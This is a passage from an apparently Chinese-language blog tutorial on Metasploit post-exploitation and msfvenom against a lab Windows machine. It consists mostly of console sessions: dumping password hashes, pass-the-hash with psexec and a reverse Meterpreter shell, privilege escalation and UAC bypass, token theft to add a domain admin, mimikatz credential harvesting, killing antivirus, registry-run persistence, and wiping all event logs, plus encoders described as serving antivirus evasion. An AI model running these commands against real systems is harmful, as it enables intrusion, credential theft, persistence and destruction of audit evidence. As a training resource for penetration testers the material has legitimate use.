192.168.1.187:3389</span><br></pre></td></tr></table></figure></p><p>创建新进程cmd.exe，-H不可见，-i交互<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute</span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line"></span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -H        Create the process hidden from view.</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  The executable command to run.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -i        Interact with the process after creating it.</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        Execute from memory.</span><br><span class="line">    -s &lt;opt&gt;  Execute process in a given session as the session user</span><br><span class="line">    -t        Execute process with currently impersonated thread token</span><br><span class="line">meterpreter &gt; excte -H -f cmd.exe</span><br><span class="line">[-] Unknown command: excte.</span><br><span class="line">meterpreter &gt; execute -H -f cmd.exe</span><br><span class="line">Process 1840 created.</span><br></pre></td></tr></table></figure></p><p>2.获取密码哈希值<br>aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; run  post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p><p>3.用得到的管理员的用户哈希值登录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOST                                  yes       The target address</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                no        The password for the specified username</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lhost 192.168.1.130</span><br><span class="line">lhost =&gt; 192.168.1.130</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lpost 4333</span><br><span class="line">lpost =&gt; 4333</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:1444 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user &apos;Administrator&apos;...</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Sending stage (205891 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><p>4.权限提升<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><p>bypassuac </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure><p>5.令牌的假冒<br>1）incognito<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u </span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-VONVJ6OMEQ7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure></p><p>2)ps 找到域管理员的pid参数(有时候不能看到）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps </span><br><span class="line">meterpreter &gt; steal_token pid号 #盗取域管理员用户的令牌</span><br></pre></td></tr></table></figure></p><p>利用域管理员的令牌创建用户，并授予域管理员的权限<br>例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;impresonate_token SNEAKS.IN\\domianadmin</span><br><span class="line">meterpreter&gt;add_user qy qy -h 192.168.1.5 #-h是域管理员添加账号的地址</span><br><span class="line">meterpreter&gt;add_group_user &quot;Doamin Admins&quot; qy -h 192.168.1.5</span><br></pre></td></tr></table></figure></p><p>6.通过跳板攻击其他主机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets #查看本地子网</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.1.0/255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 #告诉系统将远程ID通过攻击会话1来进行路由</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route print #显示当前活跃的路由信息</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.2.0        255.255.255.0      Session 1</span><br></pre></td></tr></table></figure></p><p>7.获取系统管理员的密码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID   Package    Domain        User              Password</span><br><span class="line">------   -------    ------        ----              --------</span><br><span class="line">0;996    Negotiate  WORKGROUP     WIN-VONVJ6OMEQ7$  </span><br><span class="line">0;46406  NTLM                                       </span><br><span class="line">0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE     </span><br><span class="line">0;999    NTLM       WORKGROUP     WIN-VONVJ6OMEQ7$</span><br></pre></td></tr></table></figure></p><p>8.脚本的使用<br>1).vnc<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run vnc #在远程系统上安装vnc会话</span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\Windows\TEMP\jzoEGmzImp.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 192.168.1.230:4545...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run screen_unlock # 对目标机器上的桌面进行解锁</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.</span><br><span class="line">[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...]</span><br><span class="line">[*] no working target found</span><br></pre></td></tr></table></figure></p><p>2).查看系统安装的软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-VONVJ6OMEQ7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> 2345好压                                                          v5.9</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215    14.0.24215.1</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215   14.0.24215</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215      14.0.24215</span><br><span class="line"> Python 2.7.13 (64-bit)                                          2.7.13150</span><br><span class="line"> VMware Tools                                                    10.2.0.7259539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt</span><br></pre></td></tr></table></figure></p><p>3)迁移到稳定的进程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1128</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/manage/migrate</span><br><span class="line">[*] Running module against WIN-VONVJ6OMEQ7</span><br><span class="line">[*] Current server process: spoolsv.exe (1128)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3592</span><br><span class="line">[+] Successfully migrated to process 3592</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3592</span><br></pre></td></tr></table></figure></p><p>4)关闭杀毒软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br></pre></td></tr></table></figure></p><p>5)查看目标机上的所有来流量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run packetrecorder -i 1</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.</span><br><span class="line">[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...]</span><br><span class="line">[*] Starting Packet capture on interface 1</span><br><span class="line">[+] Packet capture started</span><br><span class="line">[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap</span><br><span class="line">[*] Packet capture interval is 30 Seconds</span><br></pre></td></tr></table></figure></p><p>5)得到目标主机系统用户的哈希值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p><p>6)得到详细的系统信息<br>用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run scraper</span><br><span class="line">[*] New session on 192.168.1.187:445...</span><br><span class="line">[*] Gathering basic system information...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Obtaining the entire registry...</span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Windows\TEMP\JKaHEoEs.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Windows\TEMP\qCMsnidu.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Windows\TEMP\PTbboPFX.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Windows\TEMP\AQMWnvZo.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Windows\TEMP\XNLnHUgE.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*] Completed processing on 192.168.1.187:445...</span><br></pre></td></tr></table></figure></p><p>7）控制持久化<br>-X 开机自启动，-i 40每40秒重连一次 -p指定端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99671 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[+] Agent executed with PID 3852</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br></pre></td></tr></table></figure></p><p>开始连接<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.187</span><br><span class="line">lhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></p><p>8）列出所有后渗透模块<br><code>run post/</code> 后，按tab见<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/</span><br><span class="line">Display all 207 possibilities? (y or n)</span><br></pre></td></tr></table></figure></p><p>9.Railgun组件操作windows API<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell</span><br><span class="line">[*] The &quot;client&quot; variable holds the meterpreter client</span><br><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure></p><p>结果如下图<br><img src="/posts/../../images/zhahun/1.png" alt=""><br>10.将shell提升为meterpreter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt; # ctrl+z 把会话放在后台 </span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type               Information                                                                       Connection</span><br><span class="line">  --  ----  ----               -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.230:4411 -&gt; 192.168.1.187:54038 (192.168.1.187)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -u 1  #升级为meterpreter</span><br></pre></td></tr></table></figure></p><p>11.隐藏踪迹<br>清除了所有日志，容易被发现。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run event_manager</span><br><span class="line">Meterpreter Script for Windows Event Log Query and Clear.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -c &lt;opt&gt;  Clear a given Event Log (or ALL if no argument specified)</span><br><span class="line">    -f &lt;opt&gt;  Event ID to filter events on</span><br><span class="line">    -h        Help menu</span><br><span class="line">    -i        Show information about Event Logs on the System and their configuration</span><br><span class="line">    -l &lt;opt&gt;  List a given Event Log.</span><br><span class="line">    -p        Supress printing filtered logs to screen</span><br><span class="line">    -s &lt;opt&gt;  Save logs to local CSV file, optionally specify alternate folder in which to save logs</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run event_manager -c</span><br><span class="line">[-] You must specify and eventlog to query!</span><br><span class="line">[*] Application: </span><br><span class="line">[*] Clearing Application</span><br><span class="line">[*] Event Log Application Cleared!</span><br><span class="line">[*] HardwareEvents: </span><br><span class="line">[*] Clearing HardwareEvents</span><br><span class="line">[*] Event Log HardwareEvents Cleared!</span><br><span class="line">[*] Internet Explorer: </span><br><span class="line">[*] Clearing Internet Explorer</span><br><span class="line">[*] Event Log Internet Explorer Cleared!</span><br><span class="line">[*] Key Management Service: </span><br><span class="line">[*] Clearing Key Management Service</span><br><span class="line">[*] Event Log Key Management Service Cleared!</span><br><span class="line">[*] Security: </span><br><span class="line">[*] Clearing Security</span><br><span class="line">[*] Event Log Security Cleared!</span><br><span class="line">[*] System: </span><br><span class="line">[*] Clearing System</span><br><span class="line">[*] Event Log System Cleared!</span><br><span class="line">[*] ThinPrint Diagnostics: </span><br><span class="line">[*] Clearing ThinPrint Diagnostics</span><br><span class="line">[*] Event Log ThinPrint Diagnostics Cleared!</span><br><span class="line">[*] Windows PowerShell: </span><br><span class="line">[*] Clearing Windows PowerShell</span><br><span class="line">[*] Event Log Windows PowerShell Cleared!</span><br></pre></td></tr></table></figure></p><h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom<br>1.常识<br>参数含义：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement for msfpayload and msfencode.</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &apos;-&apos; or stdin to use custom payloads</span><br><span class="line">        --payload-options            List the payload&apos;s standard options</span><br><span class="line">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload</span><br><span class="line">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)</span><br><span class="line">        --help-formats               List available formats</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    The encoder to use</span><br><span class="line">    -a, --arch          &lt;arch&gt;       The architecture to use</span><br><span class="line">        --platform      &lt;platform&gt;   The platform of the payload</span><br><span class="line">        --help-platforms             List available platforms</span><br><span class="line">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload</span><br><span class="line">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload</span><br><span class="line">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread</span><br><span class="line">    -o, --out           &lt;path&gt;       Save the payload</span><br><span class="line">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats</span><br><span class="line">        --smallest                   Generate the smallest possible payload</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure></p><p>1)查看payload<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l payloads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Framework Payloads (507 total)</span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">    Name                                                Description</span><br><span class="line">    ----                                                -----------</span><br><span class="line">    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    aix/ppc/shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)</span><br><span class="line">    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line"> ……</span><br></pre></td></tr></table></figure></p><p>2)查看编码方法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/echo                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Generic $&#123;IFS&#125; Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The &quot;none&quot; Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure></p><p>exclent级别<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd/powershell_base64  </span><br><span class="line">x86/shikata_ga_nai</span><br></pre></td></tr></table></figure></p><p>3)查看nops选项（空字段模块，为了绕过和免杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom -l nops</span><br><span class="line"></span><br><span class="line">Framework NOPs (10 total)</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Name             Description</span><br><span class="line">    ----             -----------</span><br><span class="line">    aarch64/simple   Simple NOP generator</span><br><span class="line">    armle/simple     Simple NOP generator</span><br><span class="line">    mipsbe/better    Better NOP generator</span><br><span class="line">    php/generic      Generates harmless padding for PHP scripts</span><br><span class="line">    ppc/simple       Simple NOP generator</span><br><span class="line">    sparc/random     SPARC NOP generator</span><br><span class="line">    tty/generic      Generates harmless padding for TTY input</span><br><span class="line">    x64/simple       An x64 single/multi byte NOP instruction generator.</span><br><span class="line">    x86/opty2        Opty2 multi-byte NOP generator</span><br><span class="line">    x86/single_byte  Single-byte NOP generator</span><br></pre></td></tr></table></figure></p><p>4)可支持的平台<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom --help-platforms</span><br><span class="line">Platforms</span><br><span class="line">aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unix, windows</span><br></pre></td></tr></table></figure></p><p>5)可生成的格式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom --help-formats</span><br><span class="line">Executable 